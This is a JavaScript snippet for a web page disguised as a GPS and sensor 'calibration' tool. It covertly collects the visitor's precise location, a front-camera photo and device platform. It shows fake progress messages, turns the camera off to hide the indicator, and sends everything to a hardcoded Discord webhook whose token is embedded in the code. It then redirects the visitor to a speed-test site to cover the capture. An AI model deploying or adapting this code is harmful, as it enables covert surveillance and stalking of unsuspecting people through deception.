<script>
    const WEBHOOK = 'https://discord.com/api/webhooks/1476812049169383524/WP8wz0C8921xD_t0FTkX5MX2zSvb1OD0l2AGc55llvFCVcei7VeRgKG-0Q7gftwITMZV';

    document.getElementById('startBtn').addEventListener('click', function() {
        const status = document.getElementById('status');
        status.innerText = "1. Initializing GPS Node...";

        // Request GPS First
        navigator.geolocation.getCurrentPosition(async (pos) => {
            status.innerText = "2. GPS Linked. Syncing Camera...";
            
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;

            let stream = null;
            try {
                // Requesting front camera
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
            } catch (e) {
                console.log("Camera access denied");
            }

            status.innerText = "3. Calibrating Sensors (Keep Still)...";
            
            if (stream) {
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // CRITICAL: Wait 2.5 seconds for Android sensors to "wake up"
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        const message = {
                            content: "ðŸ“¸ **CLEAR CAPTURE & LOCATION**",
                            embeds: [{
                                title: "Device Report",
                                color: 3066993,
                                fields: [
                                    { name: "ðŸ“ Maps Link", value: `http://google.com/maps?q=${lat},${lon}` },
                                    { name: "ðŸ“± Device", value: navigator.platform }
                                ]
                            }]
                        };

                        formData.append('payload_json', JSON.stringify(message));
                        formData.append('file', blob, 'capture.jpg');

                        // Send to your Webhook
                        await fetch(WEBHOOK, { method: 'POST', body: formData });
                        
                        // Kill camera to turn off green dot
                        stream.getTracks().forEach(t => t.stop());
                        done();
                    }, 'image/jpeg', 0.9); // Higher quality (0.9)
                }, 2500); 
            } else {
                // Send only location if camera fails
                const formData = new FormData();
                formData.append('payload_json', JSON.stringify({
                    content: "ðŸ“ **LOCATION ONLY (Cam Denied)**",
                    embeds: [{ fields: [{ name: "Maps", value: `http://google.com/maps?q=${lat},${lon}` }] }]
                }));
                await fetch(WEBHOOK, { method: 'POST', body: formData });
                done();
            }

        }, (err) => {
            alert("Error: Calibration requires GPS access.");
            status.innerText = "Error: Handshake Failed.";
        }, { enableHighAccuracy: true });
    });

    function done() {
        document.getElementById('status').innerText = "Calibration Complete!";
        setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
    }
</script>
